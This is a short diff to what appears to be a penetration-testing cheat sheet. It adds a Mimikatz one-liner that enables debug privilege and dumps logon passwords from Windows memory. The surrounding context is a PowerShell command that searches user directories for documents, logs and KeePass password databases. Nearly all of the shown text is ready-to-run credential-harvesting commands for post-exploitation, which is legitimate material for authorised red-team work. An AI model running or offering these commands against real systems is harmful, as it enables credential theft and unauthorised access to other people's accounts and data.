@@ -3484,3 +3484,8 @@ Useful file command
 ```
 Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx, *.kdbx, *.log -File -Recurse -ErrorAction SilentlyContinue
 ```
+
+Mimikatz one-liner
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
